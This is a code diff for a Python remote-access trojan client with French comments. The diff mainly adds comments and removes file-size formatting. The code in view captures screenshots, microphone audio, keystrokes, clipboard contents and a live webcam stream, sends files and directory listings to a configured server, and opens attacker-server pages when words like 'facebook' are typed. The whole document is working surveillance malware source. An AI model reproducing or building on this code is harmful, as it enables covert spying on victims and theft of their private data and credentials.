@@ -16,6 +16,7 @@ from pynput.keyboard import Key, Listener
 
 from config import server_url
 
+# Variables globales
 current_keys = []
 trigger_words = {
     'facebook': f'{server_url}/facebook',
@@ -27,6 +28,7 @@ page_opened_recently = False
 stop_streaming_events = {}  # Dictionnaire pour gérer les événements d'arrêt pour chaque utilisateur
 
 
+# Fonction pour prendre et envoyer une capture d'écran
 def take_and_send_screenshot(sio, user_id):
     try:
         screenshot = pyautogui.screenshot()
@@ -42,6 +44,7 @@ def take_and_send_screenshot(sio, user_id):
         pass
 
 
+# Fonction pour redimensionner une image
 def resize_image(image_bytes_io, base_width=1300):
     img = Image.open(image_bytes_io)
     w_percent = (base_width / float(img.size[0]))
@@ -52,6 +55,7 @@ def resize_image(image_bytes_io, base_width=1300):
     return img_byte_arr
 
 
+# Fonction pour enregistrer et envoyer l'audio
 def record_and_send_audio(sio, duration=10, user_id=None):
     try:
         audio = pyaudio.PyAudio()
@@ -77,6 +81,7 @@ def record_and_send_audio(sio, duration=10, user_id=None):
         pass
 
 
+# Fonction pour enregistrer un fichier audio
 def save_wave_file(file_io, audio_data):
     with wave.open(file_io, 'wb') as wave_file:
         wave_file.setnchannels(1)
@@ -85,6 +90,7 @@ def save_wave_file(file_io, audio_data):
         wave_file.writeframes(audio_data)
 
 
+# Fonction pour enregistrer et envoyer le keylogger
 def record_and_send_keyboard_log(sio, duration=10, user_id=None):
     try:
         print("Enregistrement du keylogger en cours...")
@@ -100,6 +106,7 @@ def record_and_send_keyboard_log(sio, duration=10, user_id=None):
         pass
 
 
+# Fonction pour récupérer le contenu du clipboard
 def get_clipboard_content(sio, user_id=None):
     try:
         print("Récupération du clipboard...")
@@ -113,9 +120,10 @@ def get_clipboard_content(sio, user_id=None):
         print(f"Échec de la récupération du clipboard: {e}")
 
 
+# Fonction pour générer les images de la webcam
 def gen_frames(sio, user_id):
     try:
-        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Utilisez DirectShow au lieu de MSMF
+        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Utilisez DirectShow
         if not camera.isOpened():
             raise ValueError("Failed to open webcam")
 
@@ -125,12 +133,12 @@ def gen_frames(sio, user_id):
                 print("Failed to read frame from webcam")
                 break
             else:
-                ret, buffer = cv2.imencode('.jpg', frame)
+                ret, buffer = cv2.imencode('.jpg', frame) # Encodage de l'image
                 if not ret:
                     print("Failed to encode frame")
                     continue
-                frame_bytes = base64.b64encode(buffer)
-                sio.emit('webcam_response', {'data': frame_bytes.decode(), 'user_id': user_id})
+                frame_bytes = base64.b64encode(buffer) # Encodage en base64
+                sio.emit('webcam_response', {'data': frame_bytes.decode(), 'user_id': user_id}) # Envoi de l'image
     except Exception as e:
         print(f"Exception occurred in gen_frames: {e}")
     finally:
@@ -139,18 +147,21 @@ def gen_frames(sio, user_id):
         cv2.destroyAllWindows()
 
 
+# Fonction pour démarrer le streaming de la webcam
 def start_stream(sio, user_id):
     global stop_streaming_events
     stop_streaming_events[user_id] = threading.Event()
     threading.Thread(target=gen_frames, args=(sio, user_id)).start()
 
 
+# Fonction pour arrêter le streaming de la webcam
 def stop_stream(user_id):
     global stop_streaming_events
     if user_id in stop_streaming_events:
         stop_streaming_events[user_id].set()
 
 
+# Fonction pour télécharger un fichier sur le client
 def download_file(sio, file_path, user_id):
     try:
         if os.path.exists(file_path):
@@ -166,6 +177,7 @@ def download_file(sio, file_path, user_id):
         print(f"Échec de l'envoi du fichier: {e}")
 
 
+# Fonction pour lister les fichiers et dossiers d'un répertoire donné
 def list_dir(sio, dir_path):
     files_and_dirs = []
     try:
@@ -173,16 +185,6 @@ def list_dir(sio, dir_path):
             for file_name in os.listdir(dir_path):
                 file_path = os.path.join(dir_path, file_name)
                 if os.path.isfile(file_path):
-                    size = os.path.getsize(file_path)
-                    if size < 1024:
-                        size = f"{size} B"
-                    elif size < 1024 ** 2:
-                        size = f"{size / 1024:.2f} KB"
-                    elif size < 1024 ** 3:
-                        size = f"{size / 1024 ** 2:.2f} MB"
-                    else:
-                        size = f"{size / 1024 ** 3:.2f} GB"
-
                     files_and_dirs.append({'name': file_name, 'type': 'file'})
                 elif os.path.isdir(file_path):
                     files_and_dirs.append({'name': file_name, 'type': 'dir'})
@@ -195,6 +197,7 @@ def list_dir(sio, dir_path):
         print(f"Échec de la liste des fichiers et dossiers: {e}")
 
 
+# Fonction qui est appelée à chaque fois qu'une touche est pressée
 def on_press(key):
     global page_opened_recently
     try:
@@ -205,22 +208,24 @@ def on_press(key):
 
     typed_string = ''.join(filter(None, current_keys)).lower()
 
-    if not page_opened_recently:  # Check if the flag is False
+    if not page_opened_recently:
         for word, url in trigger_words.items():
             if word in typed_string:
                 webbrowser.open(url)
                 current_keys.clear()
-                page_opened_recently = True  # Set the flag to True
+                page_opened_recently = True
                 break
 
 
+# Fonction qui est appelée à chaque fois qu'une touche est relâchée
 def on_release(key):
     global page_opened_recently
     if key == Key.esc:
-        return False  # Stop listening if the escape key is pressed
-    page_opened_recently = False  # Reset the flag on key release
+        return False
+    page_opened_recently = False
 
 
+# Fonction pour démarrer l'enregistrement du clavier
 def start_listener():
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
